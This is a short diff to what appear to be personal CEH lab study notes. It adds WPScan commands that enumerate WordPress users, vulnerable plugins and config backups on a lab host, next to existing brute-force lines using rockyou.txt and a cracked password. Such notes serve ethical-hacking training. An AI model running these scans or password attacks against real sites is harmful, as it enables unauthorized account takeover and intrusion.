@@ -175,6 +175,9 @@ www.cehorg.com:8080 found, wamp server with DVWA but level impossible (admin:pas
 wpscan --usernames adam -P rockyou.txt --url http://192.168.0.222:8080/CEH/
 orange1234
 wpscan -U users.txt -P rockyou.txt --url http://192.168.0.222:8080/CEH/
+wpscan --url http://192.168.0.222:8080/CEH/ --enumerate u  (u usernames)
+wpscan --url http://192.168.0.222:8080/CEH/ --enumerat p   (p only vulnerable plugins)
+wpscan --url http://192.168.0.222:8080/CEH/ --enumerat cb  (cb for config backup)
 
 *You can also check http://192.168.0.222:8080/phpmyadmin/index.php
 
@@ -1633,6 +1636,7 @@ http://snarkles.net/scripts/sneak/sneak.php
 http://utf-8.jp/public/jjencode.html
 
 http://ddecode.com/phpdecoder/
+
 
 
 
